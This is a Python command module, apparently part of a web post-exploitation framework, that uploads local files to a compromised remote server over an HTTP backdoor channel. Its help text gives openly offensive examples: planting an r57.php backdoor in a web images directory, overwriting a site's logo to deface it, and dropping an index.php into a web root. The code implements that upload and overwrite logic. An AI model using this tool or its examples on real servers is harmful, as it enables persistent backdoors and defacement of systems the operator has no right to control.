"""Upload a file

SYNOPSIS:
    upload [-f] <LOCAL FILE> [<REMOTE DESTINATION>]

OPTIONS:
    -f      Overwrite destination without confirmation if it
            already exists.

DESCRIPTION:
    Upload a local file to the remote server.
    - If REMOTE DESTINATION is specified, the file is uploaded
    to this remote server destination, otherwise, the remote
    current working directory is used (which can be known with
    the 'pwd' command).
    - In the case the destination is a directory, the file will
    be copied into it keeping it's original file name.
    - Unless the '-f' option has been set, the upload process
    aborts if the detination file already exists, and asks for
    a confirmation to overwrite the file.

    NOTE: For the moment, only a single file can be uploaded
    at the time. Recursive directory uploads and multiple
    file uploads are not available.

WARNING:
    Considering the user confirmation features when the
    file which must be uploaded already exists in the remote
    server, it means that another http request will be send
    to validate overwriting.
    To prevent this, the -f option must be used if you are not
    afraid to overwrite an existing remote file.

EXAMPLES:
    > upload /data/backdoors/r75.php /var/www/images/
      - Upload your local r57.php file to the remote images dir
    > upload -f /tmp/logo-gimped.png /srv/www/img/logo.png
      - Overwrite the remote logo with your own without confirm
    > upload C:\\Users\\blackhat\\index.php
      - Upload your index.php to the remote server's current
        working directory. If your location is a web root path
        which already contains an index.php, then you must
        anwser to the confirmation request.

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import os, base64

if self.argc not in [2,3,4]:
    api.exit(self.help)

force = 0
arg1,arg2,arglen = [1,2,self.argc]
if self.argv[1] == '-f':
    force = 1
    arg1,arg2,arglen = [2,3,self.argc-1]

l_relPath = self.argv[arg1]

relPath = rpath.cwd
if arglen == 3:
    relPath = self.argv[arg2]

absPath    = rpath.abspath(relPath)
l_absPath  = os.path.abspath(l_relPath)
l_basename = os.path.basename(l_absPath)

leave = P_err+self.name+': '+l_absPath+': '

if os.path.exists(l_absPath):
    if os.path.isfile(l_absPath):
        try: data = base64.b64encode(open(l_absPath,'r').read())
        except: api.exit(leave+'Read permission denied')
    else:
        api.exit(leave+'Is not a file')
else:
    api.exit(leave+'No such file or directory')

query = {'TARGET' : absPath,
         'NAME'   : l_basename,
         'DATA'   : data,
         'FORCE'  : force}

for secondTry in range(2):
    if secondTry:
        query['FORCE'] = 1

    http.send(query)

    errs = {'noexists': 'No such remote file or directory',
            'notafile': 'Remote path is not a file',
            'nowrite':  'Remote path write permission denied'}

    if http.error in errs:
        api.exit(P_err+self.name+': %1: '+errs[http.error], http.response)

    response,target = http.response
    if response == 'ok':
        api.exit(P_inf+'Upload complete: %s -> %s' % (l_absPath, target))

    if response == 'exists' and not secondTry:
        if not reply.isyes('Remote destination %s already exists, overwrite it ?' % quot(target)):
            api.exit(P_err+self.name+': File transfer aborted')

    else:
        api.exit('Unknow error: '+str(http.response))
